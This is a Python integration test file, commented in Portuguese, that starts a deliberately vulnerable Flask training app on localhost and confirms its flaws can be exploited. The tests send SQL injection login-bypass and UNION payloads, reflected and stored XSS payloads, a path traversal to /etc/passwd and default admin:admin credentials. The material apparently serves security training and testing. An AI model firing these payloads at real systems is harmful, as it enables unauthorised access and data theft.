#!/usr/bin/env python3
"""
Testes de Integração - Aplicação Vulnerável FÁCIL
Testa se as vulnerabilidades podem ser exploradas
"""

import unittest
import requests
import subprocess
import time
import os
import signal

class TestVulnerableAppEasy(unittest.TestCase):
    """Testes de integração para app vulnerável nível fácil"""

    @classmethod
    def setUpClass(cls):
        """Inicia o servidor Flask vulnerável"""
        cls.base_url = 'http://localhost:5000'
        cls.app_dir = os.path.join(os.path.dirname(__file__), 'vulnerable_apps/easy')

        # Inicia o servidor em background
        cls.server_process = subprocess.Popen(
            ['python3', 'app.py'],
            cwd=cls.app_dir,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        # Aguarda servidor iniciar
        time.sleep(3)

        # Verifica se servidor está up
        max_attempts = 10
        for _ in range(max_attempts):
            try:
                requests.get(cls.base_url, timeout=2)
                print("[+] Servidor Easy iniciado com sucesso")
                break
            except requests.ConnectionError:
                time.sleep(1)
        else:
            raise Exception("Servidor Easy não iniciou")

    @classmethod
    def tearDownClass(cls):
        """Para o servidor Flask"""
        if hasattr(cls, 'server_process'):
            cls.server_process.terminate()
            cls.server_process.wait()
            print("[+] Servidor Easy encerrado")

    def test_001_server_is_up(self):
        """Testa se o servidor está respondendo"""
        response = requests.get(self.base_url)
        self.assertEqual(response.status_code, 200)
        self.assertIn('Vulnerable App', response.text)

    def test_002_sql_injection_basic(self):
        """Testa SQL Injection básica no login"""
        print("\n[TEST] SQL Injection básica")

        # Payload clássico: admin' OR '1'='1
        data = {
            'username': "admin' OR '1'='1",
            'password': "anything"
        }

        response = requests.post(f'{self.base_url}/login', data=data)

        # Deve fazer login com sucesso
        self.assertEqual(response.status_code, 200)
        self.assertIn('Login Successful', response.text)
        self.assertIn('admin', response.text.lower())

        print("  ✓ SQL Injection básica: SUCESSO")
        print(f"  Payload: {data['username']}")

    def test_003_sql_injection_union(self):
        """Testa SQL Injection com UNION"""
        print("\n[TEST] SQL Injection com UNION")

        # Payload UNION: ' UNION SELECT username, password, email, role FROM users--
        data = {
            'username': "' UNION SELECT 1,username,password,email,role FROM users--",
            'password': ""
        }

        response = requests.post(f'{self.base_url}/login', data=data)

        # Deve retornar dados ou erro SQL revelador
        self.assertEqual(response.status_code, 200)
        # Aceita sucesso OU erro SQL (ambos indicam vulnerabilidade)

        print("  ✓ SQL Injection UNION testado")

    def test_004_xss_reflected(self):
        """Testa XSS Reflected na busca"""
        print("\n[TEST] XSS Reflected")

        # Payload XSS simples
        xss_payload = "<script>alert('XSS')</script>"

        response = requests.get(f'{self.base_url}/search', params={'q': xss_payload})

        # Verifica se payload está refletido sem sanitização
        self.assertEqual(response.status_code, 200)
        self.assertIn(xss_payload, response.text)

        print("  ✓ XSS Reflected: VULNERÁVEL")
        print(f"  Payload refletido: {xss_payload}")

    def test_005_xss_stored_comment(self):
        """Testa XSS Stored nos comentários"""
        print("\n[TEST] XSS Stored (comentários)")

        xss_payload = "<img src=x onerror=alert('XSS')>"

        response = requests.post(f'{self.base_url}/comment',
                                data={'comment': xss_payload})

        self.assertEqual(response.status_code, 200)
        self.assertIn(xss_payload, response.text)

        print("  ✓ XSS Stored: VULNERÁVEL")

    def test_006_information_disclosure(self):
        """Testa Information Disclosure em /debug"""
        print("\n[TEST] Information Disclosure")

        response = requests.get(f'{self.base_url}/debug')

        self.assertEqual(response.status_code, 200)
        # Verifica se expõe informações sensíveis
        self.assertIn('Secret Key', response.text)
        self.assertIn('admin:admin', response.text)
        self.assertIn('FLAG', response.text)

        print("  ✓ Information Disclosure: VULNERÁVEL")
        print("  Informações sensíveis expostas em /debug")

    def test_007_broken_access_control(self):
        """Testa Broken Access Control em /admin"""
        print("\n[TEST] Broken Access Control")

        # Acessa admin sem autenticação
        response = requests.get(f'{self.base_url}/admin')

        self.assertEqual(response.status_code, 200)
        self.assertIn('Admin Panel', response.text)
        self.assertIn('FLAG', response.text)

        print("  ✓ Broken Access Control: VULNERÁVEL")
        print("  /admin acessível sem autenticação")

    def test_008_directory_listing(self):
        """Testa Directory Listing"""
        print("\n[TEST] Directory Listing")

        response = requests.get(f'{self.base_url}/files')

        self.assertEqual(response.status_code, 200)
        self.assertIn('app.py', response.text)

        print("  ✓ Directory Listing: VULNERÁVEL")

    def test_009_path_traversal(self):
        """Testa Path Traversal básico"""
        print("\n[TEST] Path Traversal")

        # Tenta ler arquivo do sistema
        response = requests.get(f'{self.base_url}/file',
                               params={'name': '../../../etc/passwd'})

        # Em ambiente de teste pode não ter /etc/passwd, mas testa a vulnerabilidade
        # Se retornar 200, é vulnerável
        if response.status_code == 200 and 'root' in response.text:
            print("  ✓ Path Traversal: VULNERÁVEL (leu /etc/passwd)")
        else:
            # Testa ler o próprio app.py
            response = requests.get(f'{self.base_url}/file',
                                   params={'name': 'app.py'})
            self.assertEqual(response.status_code, 200)
            self.assertIn('Flask', response.text)
            print("  ✓ Path Traversal: VULNERÁVEL (leu app.py)")

    def test_010_default_credentials(self):
        """Testa credenciais padrão"""
        print("\n[TEST] Credenciais Padrão")

        # Testa admin:admin
        data = {
            'username': 'admin',
            'password': 'admin'
        }

        response = requests.post(f'{self.base_url}/login', data=data)

        self.assertEqual(response.status_code, 200)
        self.assertIn('Login Successful', response.text)

        print("  ✓ Credenciais Padrão: VULNERÁVEL (admin:admin funciona)")

    def test_011_scan_with_pentest_tool(self):
        """Testa scan com a ferramenta de pentest"""
        print("\n[TEST] Scan Automatizado com Pentest Suite")

        # Este teste simula o uso da nossa ferramenta
        # Em produção, executaria: python3 pentest.py http://localhost:5000

        import sys
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

        from pentest_suite.modules.vuln_scanner import VulnerabilityScanner

        scanner = VulnerabilityScanner(self.base_url, timeout=5)

        # Testa apenas alguns endpoints para não demorar muito
        endpoints = [
            f'{self.base_url}/',
            f'{self.base_url}/search?q=test',
            f'{self.base_url}/admin'
        ]

        # Executa scan parcial
        # scanner.scan_all(endpoints) # Full scan demora muito

        # Testa detecção de SQL injection
        scanner.test_sql_injection(endpoints, None)

        # Verifica se encontrou vulnerabilidades
        report = scanner.get_report()
        self.assertGreater(report['total_vulnerabilities'], 0)

        print(f"  ✓ Scanner encontrou {report['total_vulnerabilities']} vulnerabilidades")
        print(f"    - CRITICAL: {report['by_severity']['CRITICAL']}")
        print(f"    - HIGH: {report['by_severity']['HIGH']}")
        print(f"    - MEDIUM: {report['by_severity']['MEDIUM']}")


if __name__ == '__main__':
    print("=" * 80)
    print("TESTES DE INTEGRAÇÃO - APLICAÇÃO VULNERÁVEL FÁCIL")
    print("=" * 80)
    print("\nIniciando servidor e executando testes...")
    print("=" * 80)

    unittest.main(verbosity=2)
